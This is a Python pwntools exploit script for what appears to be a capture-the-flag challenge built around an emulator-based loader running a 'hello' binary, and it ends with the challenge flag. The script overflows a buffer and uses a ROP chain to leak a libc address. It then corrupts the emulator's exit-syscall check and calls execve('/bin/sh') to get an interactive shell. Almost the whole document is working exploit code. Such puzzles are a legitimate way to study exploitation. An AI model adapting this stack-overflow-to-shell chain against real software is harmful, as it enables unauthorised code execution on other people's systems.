import re
from pwn import *
hello_elf = ELF('./hello', checksec=False)
elf = ELF('./loader', checksec=False)
libc = ELF('/usr/lib/libc.so.6', checksec=False)
p = elf.process(['hello'])
# : syscall; ret;
syscall = p64(0x00000000040024ab)
# : pop rax; ret;
pop_rax = p64(0x0000000000401001)
# : pop rdi; ret;
pop_rdi = p64(0x00000000040013af)
# : pop rsi; pop r15; ret;
pop_rsi_r15 = p64(0x00000000040013ad)
# : pop rdx; ret;
pop_rdx = p64(0x00000000040023b3)

payload = b''.join([
    # padding
    b'A'*256, b'B'*8,

    # rop
    # syscall 0x400 = b*hook_syscall+223
    # syscall 0 = b*hook_syscall+515
    # syscall 1 = b*hook_syscall+642

    # this will copy some stack address loader into hello .bss 
    # because of uc_mem_write on hook_syscall+585
    pop_rax, p64(0),
    pop_rdi, p64(0xffffffff),
    pop_rsi_r15, p64(hello_elf.bss()), p64(0),
    pop_rdx, p64(0x500),
    syscall,

    # print libc address on hello .bss
    pop_rax, p64(0x1),
    pop_rdi, p64(1),
    pop_rsi_r15, p64(hello_elf.bss()+0x1f8), p64(0),
    pop_rdx, p64(0x10),
    syscall,

    # go back to hello@main
    p64(hello_elf.sym['main'])
])

p.sendlineafter(b'name:', payload)
leak_libc = u64(re.search(br'buf=\'(.*?)\'', p.recvline_contains(b'write')).group(1).ljust(8, b'\x00'))
libc.address = eval(hex(leak_libc - libc.sym['malloc'])[:-3] + '000')
log.info(f'leak libc @ 0x{leak_libc:0x}')
log.info(f'libc base @ 0x{libc.address:0x}')

payload = b''.join([
    # padding
    b'A'*256, b'B'*8,
    
    # overwrite &exit_syscalls with 0x3b (execve syscall number), this will prevent if check on &exit_syscalls == rax
    # *(int *)(x86DisassemblerTwoByteOpcodes + reg_rdi + 0x26260) = syscall_cnt;
    pop_rax, p64(0x400),
    pop_rdi, p64(0xffffffffffffffff & -0x26260 + 0x79b8d0),

    # this will increase syscall_cnt value to 0x3b
    syscall*(0x3b-0xb),

    # call syscall execve
    pop_rax, p64(0x3b),
    pop_rdi, p64(next(libc.search(b'/bin/sh'))),
    pop_rsi_r15, p64(0)*2,
    pop_rdx, p64(0),
    syscall
])
# pause()
p.sendlineafter(b'name:', payload)
p.interactive()
# utflag{wh0_n33ds_w4sm_when_u_h4ve_q3mu}